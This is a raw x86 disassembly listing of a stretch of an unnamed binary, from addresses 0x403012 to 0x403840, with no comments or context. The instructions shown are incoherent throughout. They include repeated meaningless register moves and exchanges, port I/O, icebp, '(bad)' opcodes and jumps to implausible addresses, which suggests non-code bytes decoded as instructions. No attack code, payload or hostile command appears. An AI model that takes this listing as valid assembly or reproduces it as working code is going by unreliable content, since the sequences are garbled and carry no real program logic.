  403012:	or     eax,0x0
  403017:	add    BYTE PTR [eax-0x7bfef9df],dl
  40301d:	std    
  40301e:	add    eax,0x7cb90c1
  403023:	add    BYTE PTR [eax-0x6feef305],dl
  403029:	stc    
  40302a:	or     al,0x0
  40302c:	nop
  40302d:	and    ecx,DWORD PTR ds:0xd229007
  403033:	push   es
  403034:	nop
  403035:	adc    DWORD PTR ds:0xd109005,ecx
  40303b:	add    al,0x90
  40303d:	daa    
  40303e:	or     eax,0xd0e9003
  403043:	add    dl,BYTE PTR [eax-0x6ffef2eb]
  403049:	cld    
  40304a:	or     al,0x0
  40304c:	nop
  40304d:	or     ecx,DWORD PTR ds:0xd099000
  403053:	add    BYTE PTR [eax-0x6ffff2f7],dl
  403059:	or     DWORD PTR ds:0xd099000,ecx
  40305f:	add    BYTE PTR [eax-0x6ffff2f7],dl
  403065:	or     DWORD PTR ds:0xd099000,ecx
  40306b:	add    BYTE PTR [eax-0x6ffc194e],dl
  403071:	mov    dl,0xe6
  403073:	add    edx,DWORD PTR [eax-0x6ffc194e]
  403079:	mov    dl,0xe6
  40307b:	add    eax,DWORD PTR [eax]
  40307d:	add    BYTE PTR [eax],al
  40307f:	add    BYTE PTR [eax],al
  403081:	nop
  403082:	mov    dl,0xe5
  403084:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  40308a:	mov    dl,0xe5
  40308c:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  403092:	mov    dl,0xe4
  403094:	add    edx,DWORD PTR [eax-0x6ffc1b4e]
  40309a:	mov    dl,0xe4
  40309c:	add    edx,DWORD PTR [eax-0x6ffc1b4e]
  4030a2:	mov    dl,0xe3
  4030a4:	add    edx,DWORD PTR [eax-0x6ffc144e]
  4030aa:	mov    dl,0xe3
  4030ac:	add    edx,DWORD PTR [eax-0x6ffc144e]
  4030b2:	mov    dl,0xe2
  4030b4:	add    edx,DWORD PTR [eax-0x6ffc154e]
  4030ba:	mov    dl,0xe2
  4030bc:	add    edx,DWORD PTR [eax-0x6ffc154e]
  4030c2:	mov    dl,0xe7
  4030c4:	add    edx,DWORD PTR [eax-0x7e0d284e]
  4030ca:	mov    dl,0xef
  4030cc:	add    al,0x89
  4030ce:	mov    ah,0xed
  4030d0:	push   es
  4030d1:	mov    esi,DWORD PTR [esi-0x4f62ff05]
  4030d7:	loope  0x4030db
  4030d9:	xchg   edi,eax
  4030da:	mov    dl,0xe7
  4030dc:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4030e2:	mov    dl,0xe7
  4030e4:	add    eax,DWORD PTR [eax]
  4030e6:	add    BYTE PTR [eax],al
  4030e8:	add    BYTE PTR [eax],al
  4030ea:	nop
  4030eb:	mov    dl,0xe7
  4030ed:	add    edx,DWORD PTR [eax-0x6c17f14e]
  4030f3:	mov    dl,0xe
  4030f5:	call   0xeb4ee38d
  4030fa:	xchg   ebx,eax
  4030fb:	mov    dl,0xe
  4030fd:	jmp    0x403092
  4030ff:	mov    dl,0xe
  403101:	jmp    0xb293:0xea0eb293
  403108:	push   cs
  403109:	in     eax,dx
  40310a:	xchg   ebx,eax
  40310b:	mov    dl,0xe
  40310d:	in     eax,0x93
  40310f:	mov    dl,0xe
  403111:	in     al,dx
  403112:	xchg   ebx,eax
  403113:	mov    dl,0xe
  403115:	in     al,0x93
  403117:	mov    dl,0xe
  403119:	out    dx,eax
  40311a:	xchg   ebx,eax
  40311b:	mov    dl,0xe
  40311d:	out    0x93,eax
  40311f:	mov    dl,0xe
  403121:	out    dx,al
  403122:	xchg   ebx,eax
  403123:	mov    dl,0xe
  403125:	out    0x93,al
  403127:	mov    dl,0xe
  403129:	icebp  
  40312a:	xchg   ebx,eax
  40312b:	mov    dl,0xe
  40312d:	icebp  
  40312e:	xchg   ebx,eax
  40312f:	mov    dl,0xe
  403131:	loopne 0x4030c6
  403133:	mov    dl,0xe
  403135:	loopne 0x4030ca
  403137:	mov    dl,0xe
  403139:	repz xchg ebx,eax
  40313b:	mov    dl,0xe
  40313d:	repz xchg ebx,eax
  40313f:	mov    dl,0xe
  403141:	loop   0x4030d6
  403143:	mov    dl,0xe
  403145:	loop   0x4030da
  403147:	mov    dl,0xe
  403149:	cmc    
  40314a:	xchg   ebx,eax
  40314b:	mov    dl,0xe
  40314d:	in     eax,dx
  40314e:	add    BYTE PTR [eax],al
  403150:	add    BYTE PTR [eax],al
  403152:	add    BYTE PTR [ebx-0x6c1bf14e],dl
  403158:	mov    dl,0xe
  40315a:	fcom   QWORD PTR [ebx-0x6c16f14e]
  403160:	mov    dl,0xe
  403162:	jmp    0xe94ee3fa
  403167:	xchg   ebx,eax
  403168:	mov    dl,0xe
  40316a:	jmp    0x4ee402
  40316f:	jns    0x403127
  403171:	push   cs
  403172:	add    BYTE PTR [ecx-0x4a],bh
  403175:	push   cs
  403176:	add    BYTE PTR [ecx-0x4a],ch
  403179:	push   cs
  40317a:	add    BYTE PTR [ecx-0x4a],ch
  40317d:	push   cs
  40317e:	add    BYTE PTR [ecx],bh
  403180:	mov    dh,0xe
  403182:	add    BYTE PTR [ecx],bh
  403184:	mov    dh,0xe
  403186:	add    BYTE PTR [ecx],ch
  403188:	mov    dh,0xe
  40318a:	add    BYTE PTR [ecx],ch
  40318c:	mov    dh,0xe
  40318e:	add    BYTE PTR [ecx],bh
  403190:	mov    dh,0xe
  403192:	add    BYTE PTR [ecx],bh
  403194:	mov    dh,0xe
  403196:	add    BYTE PTR [ecx],ch
  403198:	mov    dh,0xe
  40319a:	add    BYTE PTR [ecx],ch
  40319c:	mov    dh,0xe
  40319e:	add    bl,bh
  4031a0:	mov    ch,0xe
  4031a2:	add    dl,bh
  4031a4:	mov    ch,0xe
  4031a6:	add    dh,ch
  4031a8:	mov    ch,0xe
  4031aa:	add    cl,ch
  4031ac:	mov    ch,0xe
  4031ae:	add    ch,ah
  4031b0:	mov    ch,0x6
  4031b2:	add    BYTE PTR [ebp-0x52],dh
  4031b5:	push   es
  4031b6:	add    BYTE PTR [eax],al
  4031b8:	add    BYTE PTR [eax],al
  4031ba:	add    BYTE PTR [eax],al
  4031bc:	mov    ch,0xae
  4031be:	push   es
  4031bf:	add    ch,dh
  4031c1:	scas   al,BYTE PTR es:[edi]
  4031c2:	push   es
  4031c3:	add    ch,ah
  4031c5:	mov    ch,0x6
  4031c7:	add    BYTE PTR [ebp-0x52],dl
  4031ca:	push   es
  4031cb:	add    BYTE PTR [ebp+0x350006ae],dl
  4031d1:	scas   al,BYTE PTR es:[edi]
  4031d2:	push   es
  4031d3:	add    BYTE PTR [ebp+0x450006b5],dh
  4031d9:	scas   al,BYTE PTR es:[edi]
  4031da:	push   es
  4031db:	add    BYTE PTR [ebp+0x50006ae],al
  4031e1:	scas   eax,DWORD PTR es:[edi]
  4031e2:	push   es
  4031e3:	add    BYTE PTR [ebp+0x250006ae],dh
  4031e9:	scas   al,BYTE PTR es:[edi]
  4031ea:	push   es
  4031eb:	add    BYTE PTR [eax-0x6ff7f301],dl
  4031f1:	or     cl,BYTE PTR [bx+si]
  4031f4:	nop
  4031f5:	or     eax,0x8d90080d
  4031fa:	or     cl,BYTE PTR [eax]
  4031fc:	nop
  4031fd:	dec    ebp
  4031fe:	or     eax,0xacd9008
  403203:	or     BYTE PTR [eax-0x6ff7f313],dl
  403209:	ins    DWORD PTR es:[edi],dx
  40320a:	or     cl,BYTE PTR [eax]
  40320c:	nop
  40320d:	sub    eax,0xad90080d
  403212:	or     cl,BYTE PTR [eax]
  403214:	nop
  403215:	std    
  403216:	or     al,0x8
  403218:	nop
  403219:	jge    0x403225
  40321b:	or     BYTE PTR [eax+0x80d3d],dl
  403221:	add    BYTE PTR [eax],al
  403223:	add    BYTE PTR [eax],al
  403225:	nop
  403226:	mov    ebp,0xbd90080a
  40322b:	or     cl,BYTE PTR [eax]
  40322d:	nop
  40322e:	cmp    eax,0x7d90080d
  403233:	or     cl,BYTE PTR [eax]
  403235:	nop
  403236:	std    
  403237:	or     al,0x8
  403239:	nop
  40323a:	and    eax,0xa590080d
  40323f:	or     eax,0xad59008
  403244:	or     BYTE PTR [eax-0x6ff7f2ab],dl
  40324a:	add    eax,0x8590080d
  40324f:	or     eax,0xab59008
  403254:	or     BYTE PTR [eax-0x6ff7f2cb],dl
  40325a:	adc    eax,0x9590080d
  40325f:	or     eax,0xac59008
  403264:	or     BYTE PTR [eax-0x6ff7f2bb],dl
  40326a:	mov    dl,0x2d
  40326c:	add    al,0x98
  40326e:	mov    dl,0xad
  403270:	add    ecx,DWORD PTR [eax-0x77fc224e]
  403276:	mov    dl,0x5d
  403278:	add    ebx,DWORD PTR [eax-0x67fc1e4e]
  40327e:	mov    dl,0x69
  403280:	add    ecx,DWORD PTR [eax-0x77fc5e4e]
  403286:	mov    dl,0x29
  403288:	add    eax,DWORD PTR [eax]
  40328a:	add    BYTE PTR [eax],al
  40328c:	add    BYTE PTR [eax],al
  40328e:	cwde   
  40328f:	mov    dl,0xc1
  403291:	add    ebx,DWORD PTR [eax-0x77fcb64e]
  403297:	mov    dl,0x81
  403299:	add    ecx,DWORD PTR [eax-0x67fcf64e]
  40329f:	mov    dl,0xd1
  4032a1:	add    ebx,DWORD PTR [eax-0x77fca64e]
  4032a7:	mov    dl,0x91
  4032a9:	add    ecx,DWORD PTR [eax-0x67fce64e]
  4032af:	mov    dl,0x11
  4032b1:	add    al,0x98
  4032b3:	mov    dl,0x99
  4032b5:	add    al,0x88
  4032b7:	mov    dl,0x51
  4032b9:	add    al,0x88
  4032bb:	mov    dl,0xd9
  4032bd:	add    al,0x98
  4032bf:	mov    dl,0xf9
  4032c1:	add    ebx,DWORD PTR [eax-0x77fb9e4e]
  4032c7:	mov    dl,0x29
  4032c9:	add    al,0x88
  4032cb:	mov    dl,0x91
  4032cd:	add    al,0x98
  4032cf:	mov    dl,0xd9
  4032d1:	add    ebx,DWORD PTR [eax-0x77fbbe4e]
  4032d7:	mov    dl,0x9
  4032d9:	add    al,0x88
  4032db:	mov    dl,0x71
  4032dd:	add    al,0x98
  4032df:	mov    dl,0xe9
  4032e1:	add    ebx,DWORD PTR [eax-0x77fbae4e]
  4032e7:	mov    dl,0xe
  4032e9:	pop    ss
  4032ea:	mov    WORD PTR [edx-0x556b70f2],gs
  4032f0:	push   cs
  4032f1:	daa    
  4032f2:	add    BYTE PTR [eax],al
  4032f4:	add    BYTE PTR [eax],al
  4032f6:	add    BYTE PTR [edx+ebp*4-0x556b60f2],cl
  4032fd:	push   cs
  4032fe:	xlat   BYTE PTR ds:[ebx]
  4032ff:	xchg   ebx,eax
  403300:	stos   BYTE PTR es:[edi],al
  403301:	push   cs
  403302:	dec    edi
  403303:	xchg   esp,eax
  403304:	stos   BYTE PTR es:[edi],al
  403305:	push   cs
  403306:	call   0x684edd9e
  40330b:	xchg   esp,eax
  40330c:	stos   BYTE PTR es:[edi],al
  40330d:	push   cs
  40330e:	test   al,0x93
  403310:	stos   BYTE PTR es:[edi],al
  403311:	push   cs
  403312:	sub    BYTE PTR [edx+ebp*4-0x556c37f2],dl
  403319:	push   cs
  40331a:	dec    eax
  40331b:	xchg   esp,eax
  40331c:	stos   BYTE PTR es:[edi],al
  40331d:	push   cs
  40331e:	mov    BYTE PTR [ebx-0x6bf7f156],dl
  403324:	stos   BYTE PTR es:[edi],al
  403325:	push   cs
  403326:	fcom   DWORD PTR [ebx-0x6ba7f156]
  40332c:	stos   BYTE PTR es:[edi],al
  40332d:	push   cs
  40332e:	cwde   
  40332f:	xchg   ebx,eax
  403330:	stos   BYTE PTR es:[edi],al
  403331:	push   cs
  403332:	sbb    BYTE PTR [edx+ebp*4-0x5573e7f2],dl
  403339:	push   cs
  40333a:	cwde   
  40333b:	xchg   ebx,eax
  40333c:	stos   BYTE PTR es:[edi],al
  40333d:	push   cs
  40333e:	pop    eax
  40333f:	mov    WORD PTR [edx-0x556c27f2],gs
  403345:	push   cs
  403346:	lock xchg ebx,eax
  403348:	stos   BYTE PTR es:[edi],al
  403349:	push   cs
  40334a:	jo     0x4032df
  40334c:	stos   BYTE PTR es:[edi],al
  40334d:	push   cs
  40334e:	and    BYTE PTR [edx+ebp*4-0x556c5ff2],cl
  403355:	push   cs
  403356:	rcl    BYTE PTR [ebx+0x500eaa],1
  40335c:	add    BYTE PTR [eax],al
  40335e:	add    BYTE PTR [eax],al
  403360:	xchg   ebx,eax
  403361:	stos   BYTE PTR es:[edi],al
  403362:	push   cs
  403363:	add    BYTE PTR [edx+ebp*4-0x556c7ff2],cl
  40336a:	push   cs
  40336b:	add    BYTE PTR [eax+0x300006b2],dh
  403371:	mov    bl,0x6
  403373:	add    BYTE PTR [eax+0x200006ae],al
  403379:	mov    dl,0x6
  40337b:	add    BYTE PTR [eax+0x300006ae],dh
  403381:	mov    dl,0x6
  403383:	add    BYTE PTR [eax-0x4e],ah
  403386:	push   es
  403387:	add    al,al
  403389:	mov    cl,0x6
  40338b:	add    BYTE PTR [edx+esi*4+0x6],dh
  40338f:	add    ah,dh
  403391:	mov    cl,0x6
  403393:	add    BYTE PTR [edx+esi*4],ah
  403396:	push   es
  403397:	add    BYTE PTR [ecx+esi*4+0x6],dh
  40339b:	add    BYTE PTR [edx+esi*4+0x6],dl
  40339f:	add    ah,dl
  4033a1:	mov    cl,0x6
  4033a3:	add    BYTE PTR [edx+esi*4],al
  4033a6:	push   es
  4033a7:	add    BYTE PTR [ecx+esi*4-0x4dbbfffa],dl
  4033ae:	push   es
  4033af:	add    ah,al
  4033b1:	mov    cl,0x6
  4033b3:	add    ah,dh
  4033b5:	mov    cl,0x6
  4033b7:	add    BYTE PTR [ecx+esi*4-0x515bfffa],ah
  4033be:	push   es
  4033bf:	add    BYTE PTR [edi+ebp*4],ah
  4033c2:	push   es
  4033c3:	add    BYTE PTR [eax],al
  4033c5:	add    BYTE PTR [eax],al
  4033c7:	add    BYTE PTR [eax],al
  4033c9:	push   esp
  4033ca:	scas   al,BYTE PTR es:[edi]
  4033cb:	push   es
  4033cc:	add    ah,al
  4033ce:	scas   al,BYTE PTR es:[edi]
  4033cf:	push   es
  4033d0:	add    ah,bl
  4033d2:	mov    cl,0x6
  4033d4:	add    BYTE PTR [esi+ebp*4+0x6],ch
  4033d8:	add    BYTE PTR [esi+ebp*4-0x50d3fffa],ch
  4033df:	push   es
  4033e0:	add    ah,bl
  4033e2:	mov    cl,0x6
  4033e4:	add    BYTE PTR [esi+ebp*4+0x6],cl
  4033e8:	add    BYTE PTR [eax-0x6ff7f552],dl
  4033ee:	xchg   esi,eax
  4033ef:	or     cl,BYTE PTR [eax]
  4033f1:	nop
  4033f2:	push   cs
  4033f3:	or     eax,0xa769008
  4033f8:	or     BYTE PTR [eax-0x6ff7f542],dl
  4033fe:	or     cl,BYTE PTR es:[eax]
  403401:	nop
  403402:	into   
  403403:	or     cl,BYTE PTR [eax]
  403405:	nop
  403406:	or     cl,BYTE PTR ss:[eax]
  403409:	nop
  40340a:	dec    BYTE PTR [eax+ecx*1]
  40340d:	nop
  40340e:	data16 or cl,BYTE PTR [eax]
  403411:	nop
  403412:	clc    
  403413:	or     al,0x9
  403415:	nop
  403416:	clc    
  403417:	or     DWORD PTR [ecx],ecx
  403419:	nop
  40341a:	js     0x403426
  40341c:	or     DWORD PTR [eax-0x6ff6f488],edx
  403422:	pop    eax
  403423:	or     eax,0xa589009
  403428:	or     DWORD PTR [eax+0x90ad8],edx
  40342e:	add    BYTE PTR [eax],al
  403430:	add    BYTE PTR [eax],al
  403432:	nop
  403433:	fmul   DWORD PTR [ebx]
  403435:	or     DWORD PTR [eax-0x6ff6f2a8],edx
  40343b:	pop    eax
  40343c:	or     cl,BYTE PTR [ecx]
  40343e:	nop
  40343f:	fmul   DWORD PTR [edx]
  403441:	or     DWORD PTR [eax-0x6ff6f428],edx
  403447:	js     0x403453
  403449:	or     DWORD PTR [eax-0x6ff6f488],edx
  40344f:	clc    
  403450:	or     al,0x9
  403452:	nop
  403453:	clc    
  403454:	or     DWORD PTR [ecx],ecx
  403456:	nop
  403457:	and    BYTE PTR ds:0xa209009,cl
  40345d:	or     DWORD PTR [eax-0x6ff6f270],edx
  403463:	nop
  403464:	or     cl,BYTE PTR [ecx]
  403466:	nop
  403467:	mov    dl,0x3c
  403469:	add    al,0x89
  40346b:	mov    dl,0x3c
  40346d:	add    eax,0x3acb289
  403472:	cdq    
  403473:	mov    dl,0xac
  403475:	add    al,0x99
  403477:	mov    dl,0xdc
  403479:	add    ecx,DWORD PTR [ecx-0x76fb234e]
  40347f:	mov    dl,0x4c
  403481:	add    ebx,DWORD PTR [ecx-0x66fbb34e]
  403487:	mov    dl,0xdc
  403489:	add    ecx,DWORD PTR [ecx-0x76fb234e]
  40348f:	mov    dl,0x4c
  403491:	add    ebx,DWORD PTR [ecx+0x44cb2]
  403497:	add    BYTE PTR [eax],al
  403499:	add    BYTE PTR [eax],al
  40349b:	cdq    
  40349c:	mov    dl,0xec
  40349e:	add    ecx,DWORD PTR [ecx-0x76fb134e]
  4034a4:	mov    dl,0x5c
  4034a6:	add    ebx,DWORD PTR [ecx-0x66fba34e]
  4034ac:	mov    dl,0xcc
  4034ae:	add    ecx,DWORD PTR [ecx-0x76fb334e]
  4034b4:	mov    dl,0x3c
  4034b6:	add    ebx,DWORD PTR [ecx-0x66fbc34e]
  4034bc:	mov    dl,0xcc
  4034be:	add    ecx,DWORD PTR [ecx-0x76fb334e]
  4034c4:	mov    dl,0x3c
  4034c6:	add    ebx,DWORD PTR [ecx-0x66fbc34e]
  4034cc:	mov    dl,0x6c
  4034ce:	add    al,0x89
  4034d0:	mov    dl,0x6c
  4034d2:	add    ecx,DWORD PTR [ecx-0x66fb234e]
  4034d8:	mov    dl,0xdc
  4034da:	add    ebx,DWORD PTR [ecx-0x76fc1f4e]
  4034e0:	mov    dl,0xe8
  4034e2:	add    cl,BYTE PTR [ecx-0x6b91f14e]
  4034e8:	test   eax,0xa993660e
  4034ed:	push   cs
  4034ee:	cs xchg esp,eax
  4034f0:	test   eax,0xa993260e
  4034f5:	push   cs
  4034f6:	scas   al,BYTE PTR es:[edi]
  4034f7:	xchg   esp,eax
  4034f8:	test   eax,0xa993a60e
  4034fd:	push   cs
  4034fe:	into   
  4034ff:	add    BYTE PTR [eax],al
  403501:	add    BYTE PTR [eax],al
  403503:	add    BYTE PTR [ebx-0x6d39f157],dl
  403509:	test   eax,0xa9944e0e
  40350e:	push   cs
  40350f:	inc    esi
  403510:	xchg   ebx,eax
  403511:	test   eax,0xa993ce0e
  403516:	push   cs
  403517:	(bad)  
  403518:	xchg   edx,eax
  403519:	test   eax,0xa9944e0e
  40351e:	push   cs
  40351f:	inc    esi
  403520:	xchg   ebx,eax
  403521:	test   eax,0xa993de0e
  403526:	push   cs
  403527:	(bad)  
  403528:	xchg   edx,eax
  403529:	test   eax,0xa9945e0e
  40352e:	push   cs
  40352f:	push   esi
  403530:	xchg   ebx,eax
  403531:	test   eax,0xa993be0e
  403536:	push   cs
  403537:	mov    dh,0x92
  403539:	test   eax,0xa9943e0e
  40353e:	push   cs
  40353f:	ss xchg ebx,eax
  403541:	test   eax,0xa993be0e
  403546:	push   cs
  403547:	mov    dh,0x92
  403549:	test   eax,0xa9943e0e
  40354e:	push   cs
  40354f:	ss xchg ebx,eax
  403551:	test   eax,0xa9945e0e
  403556:	push   cs
  403557:	push   esi
  403558:	xchg   ebx,eax
  403559:	test   eax,0xa993de0e
  40355e:	push   cs
  40355f:	(bad)  
  403560:	xchg   edx,eax
  403561:	test   eax,0xaee6000e
  403566:	pop    es
  403567:	add    BYTE PTR [eax],al
  403569:	add    BYTE PTR [eax],al
  40356b:	add    BYTE PTR [eax],al
  40356d:	out    0xaf,al
  40356f:	pop    es
  403570:	add    BYTE PTR [esi],dh
  403572:	scas   eax,DWORD PTR es:[edi]
  403573:	pop    es
  403574:	add    BYTE PTR [esi-0x50],ah
  403577:	pop    es
  403578:	add    BYTE PTR [esi+0x660007ae],al
  40357e:	scas   eax,DWORD PTR es:[edi]
  40357f:	pop    es
  403580:	add    dh,dh
  403582:	scas   al,BYTE PTR es:[edi]
  403583:	pop    es
  403584:	add    BYTE PTR [esi],al
  403586:	mov    al,0x7
  403588:	add    dh,al
  40358a:	scas   al,BYTE PTR es:[edi]
  40358b:	pop    es
  40358c:	add    dh,al
  40358e:	scas   eax,DWORD PTR es:[edi]
  40358f:	pop    es
  403590:	add    dh,dl
  403592:	mov    ch,0x7
  403594:	add    dh,al
  403596:	mov    ah,0x7
  403598:	add    BYTE PTR [esi-0x4a],ah
  40359b:	pop    es
  40359c:	add    BYTE PTR [esi-0x4b],al
  40359f:	pop    es
  4035a0:	add    dh,dl
  4035a2:	mov    ch,0x7
  4035a4:	add    BYTE PTR [esi+0x760007b4],ah
  4035aa:	mov    dh,0x7
  4035ac:	add    BYTE PTR [esi],dh
  4035ae:	mov    ch,0x7
  4035b0:	add    dh,ah
  4035b2:	mov    ch,0x7
  4035b4:	add    dh,dl
  4035b6:	mov    ah,0x7
  4035b8:	add    BYTE PTR [esi-0x4a],dl
  4035bb:	pop    es
  4035bc:	add    dh,dh
  4035be:	mov    ah,0x7
  4035c0:	add    BYTE PTR [esi-0x4b],ah
  4035c3:	pop    es
  4035c4:	add    BYTE PTR [esi-0x4c],dh
  4035c7:	pop    es
  4035c8:	add    BYTE PTR [esi-0x4a],dl
  4035cb:	pop    es
  4035cc:	add    dh,dl
  4035ce:	mov    ah,0x7
  4035d0:	add    BYTE PTR [eax],al
  4035d2:	add    BYTE PTR [eax],al
  4035d4:	add    BYTE PTR [eax],al
  4035d6:	(bad)  
  4035d7:	mov    ch,0x7
  4035d9:	add    BYTE PTR [esi+0x760007b4],dh
  4035df:	mov    dh,0x7
  4035e1:	add    BYTE PTR [esi-0x49],dl
  4035e4:	pop    es
  4035e5:	add    BYTE PTR [eax-0x6ff6f618],dl
  4035eb:	add    BYTE PTR [ebx],cl
  4035ed:	or     DWORD PTR [eax-0x6ff8f2e5],edx
  4035f3:	fisttp DWORD PTR [edx]
  4035f5:	pop    es
  4035f6:	nop
  4035f7:	mov    ebx,0x7b90070a
  4035fc:	or     al,BYTE PTR [edi]
  4035fe:	nop
  4035ff:	or     ecx,DWORD PTR ds:0xacb9007
  403605:	pop    es
  403606:	nop
  403607:	jmp    0x403615
  403609:	pop    es
  40360a:	nop
  40360b:	stos   DWORD PTR es:[edi],eax
  40360c:	or     al,BYTE PTR [edi]
  40360e:	nop
  40360f:	add    ecx,DWORD PTR ds:0xac39007
  403615:	pop    es
  403616:	nop
  403617:	repz or al,0x7
  40361a:	nop
  40361b:	mov    bl,0xa
  40361d:	pop    es
  40361e:	nop
  40361f:	mov    bl,0xa
  403621:	pop    es
  403622:	nop
  403623:	repz or al,0x7
  403626:	nop
  403627:	mov    ds:0xe390070a,eax
  40362c:	or     al,0x7
  40362e:	nop
  40362f:	pop    ds
  403630:	or     eax,0xd579007
  403635:	pop    es
  403636:	nop
  403637:	mov    edi,0x70a
  40363c:	add    BYTE PTR [eax],al
  40363e:	add    BYTE PTR [eax-0x6ff8f309],dl
  403644:	prefetch BYTE PTR [edi]
  403647:	nop
  403648:	inc    edi
  403649:	or     eax,0xcef9007
  40364e:	pop    es
  40364f:	nop
  403650:	daa    
  403651:	or     eax,0xd1c9007
  403656:	or     BYTE PTR [eax-0x6ff7f564],dl
  40365c:	pop    esp
  40365d:	or     eax,0xadc9008
  403662:	or     BYTE PTR [eax-0x77fbfb4e],dl
  403668:	mov    dl,0x84
  40366a:	add    ebx,DWORD PTR [eax-0x67fbbb4e]
  403670:	mov    dl,0xc4
  403672:	add    ecx,DWORD PTR [eax-0x72fc184e]
  403678:	mov    dl,0xd7
  40367a:	add    edx,DWORD PTR [ebp-0x72fc104e]
  403680:	mov    dl,0xdf
  403682:	add    edx,DWORD PTR [ebp-0x72fc1c4e]
  403688:	mov    dl,0xfb
  40368a:	add    edx,DWORD PTR [ebp-0x72fc144e]
  403690:	mov    dl,0xe3
  403692:	add    edx,DWORD PTR [ebp-0x72fc1a4e]
  403698:	mov    dl,0xd5
  40369a:	add    edx,DWORD PTR [ebp-0x72fc124e]
  4036a0:	mov    dl,0xdd
  4036a2:	add    eax,DWORD PTR [eax]
  4036a4:	add    BYTE PTR [eax],al
  4036a6:	add    BYTE PTR [eax],al
  4036a8:	xchg   ebp,eax
  4036a9:	mov    dl,0xe1
  4036ab:	add    ecx,DWORD PTR [ebp-0x6afc064e]
  4036b1:	mov    dl,0xe9
  4036b3:	add    ecx,DWORD PTR [ebp-0x6afc1e4e]
  4036b9:	mov    dl,0xe6
  4036bb:	add    ecx,DWORD PTR [ebp-0x6afc294e]
  4036c1:	mov    dl,0xee
  4036c3:	add    ecx,DWORD PTR [ebp-0x6afc214e]
  4036c9:	mov    dl,0xe2
  4036cb:	add    ecx,DWORD PTR [ebp-0x6afc054e]
  4036d1:	mov    dl,0xea
  4036d3:	add    ecx,DWORD PTR [ebp-0x6afc1d4e]
  4036d9:	mov    dl,0xe4
  4036db:	add    ecx,DWORD PTR [ebp-0x6afc2b4e]
  4036e1:	mov    dl,0xe
  4036e3:	loop   0x403678
  4036e5:	mov    ch,0xe
  4036e7:	rcl    BYTE PTR [ebx-0x6c11f14b],cl
  4036ed:	mov    ch,0xe
  4036ef:	not    BYTE PTR [ebx-0x6d16f14b]
  4036f5:	mov    ah,0xd
  4036f7:	in     eax,0x97
  4036f9:	mov    ch,0xb
  4036fb:	out    dx,eax
  4036fc:	mov    DWORD PTR [eax-0x486719f8],edi
  403702:	or     ecx,esp
  403704:	fwait
  403705:	mov    edx,0xba8be106
  40370a:	push   es
  40370b:	lock add BYTE PTR [eax],al
  40370e:	add    BYTE PTR [eax],al
  403710:	add    BYTE PTR [edx-0x650ff847],cl
  403716:	mov    ecx,0xbc95e307
  40371b:	add    al,0xe3
  40371d:	lea    edi,[esp+eax*1+0x4bc85f3]
  403724:	repz popf 
  403726:	mov    esp,0xbb94e204
  40372b:	add    eax,0x5bb8ce2
  403730:	repnz test BYTE PTR [ebx-0x44630dfb],bh
  403737:	add    eax,0x2be97e5
  40373c:	fisttp QWORD PTR [edi-0x780afd42]
  403742:	mov    esi,0xbe9fed02
  403747:	add    ah,ch
  403749:	xchg   edi,eax
  40374a:	mov    esi,0xbe8fdd02
  40374f:	add    dh,ch
  403751:	xchg   DWORD PTR [esi-0x416012fe],edi
  403757:	add    ah,ah
  403759:	xchg   esi,eax
  40375a:	mov    ebp,0xbd8edc03
  40375f:	add    eax,DWORD PTR [eax]
  403761:	sbb    al,0xc0
  403763:	add    ecx,DWORD PTR ds:0xd03bffc
  403769:	in     al,dx
  40376a:	mov    edi,0xbfdc0d03
  40376f:	add    ecx,DWORD PTR ds:0xd03bffc
  403775:	add    BYTE PTR [eax],al
  403777:	add    BYTE PTR [eax],al
  403779:	add    ah,bh
  40377b:	mov    edi,0xa0ef0d03
  403780:	add    BYTE PTR [esi],cl
  403782:	mov    edi,0xdf0e00a0
  403787:	mov    al,ds:0xa0bf0e00
  40378c:	add    BYTE PTR [esi],cl
  40378e:	scas   eax,DWORD PTR es:[edi]
  40378f:	mov    al,ds:0xa0df0e00
  403794:	add    BYTE PTR [esi],cl
  403796:	mov    edi,0xbf0e00a0
  40379b:	mov    al,ds:0xa0af0e00
  4037a0:	add    BYTE PTR [esi],cl
  4037a2:	mov    edi,0x9f0e00a0
  4037a7:	mov    al,ds:0xa47f0e00
  4037ac:	add    BYTE PTR [esi],cl
  4037ae:	outs   dx,DWORD PTR ds:[esi]
  4037af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037b0:	add    BYTE PTR [esi],cl
  4037b2:	pop    edi
  4037b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037b4:	add    BYTE PTR [esi],cl
  4037b6:	jg     0x40375c
  4037b8:	add    BYTE PTR [esi],cl
  4037ba:	jg     0x403760
  4037bc:	add    BYTE PTR [esi],cl
  4037be:	outs   dx,BYTE PTR ds:[esi]
  4037bf:	mov    ds:0xa33e0f01,eax
  4037c4:	add    DWORD PTR [edi],ecx
  4037c6:	pop    esi
  4037c7:	mov    ds:0xa33e0f01,eax
  4037cc:	add    DWORD PTR [edi],ecx
  4037ce:	mov    cs:0xa35e0f01,eax
  4037d4:	add    DWORD PTR [edi],ecx
  4037d6:	mov    ds:0xa33e0f01,eax
  4037dc:	add    DWORD PTR [edi],ecx
  4037de:	add    BYTE PTR [eax],al
  4037e0:	add    BYTE PTR [eax],al
  4037e2:	add    BYTE PTR [eax-0x70f0e1ec],dl
  4037e8:	in     al,dx
  4037e9:	sbb    eax,0x1e04870f
  4037ee:	setg   BYTE PTR [esi+ebx*1]
  4037f2:	seta   BYTE PTR [esi+ebx*1]
  4037f6:	jg     0x874f55e8
  4037fc:	add    al,0x0
  4037fe:	setg   BYTE PTR [eax+eax*1]
  403802:	seta   BYTE PTR [ebx]
  403805:	or     eax,0x1f098110
  40380a:	adc    eax,DWORD PTR [ebx-0x5bebe711]
  403810:	out    0x15,al
  403812:	adc    eax,0x161aed9d
  403817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403818:	in     eax,0x1a
  40381a:	push   ss
  40381b:	sahf   
  40381c:	or     al,0x18
  40381e:	pop    ss
  40381f:	xchg   DWORD PTR [eax+ebx*1],eax
  403822:	pop    ss
  403823:	jg     0x403828
  403825:	adc    eax,0x15037818
  40382a:	sbb    BYTE PTR [eax+0x13],bh
  40382d:	adc    eax,0x1513a818
  403832:	sbb    BYTE PTR [eax-0x66e6ee1e],ch
  403838:	loop   0x40384b
  40383a:	sbb    DWORD PTR [ecx-0x76e6ec4e],ebx
  403840:	mov    dl,0x13
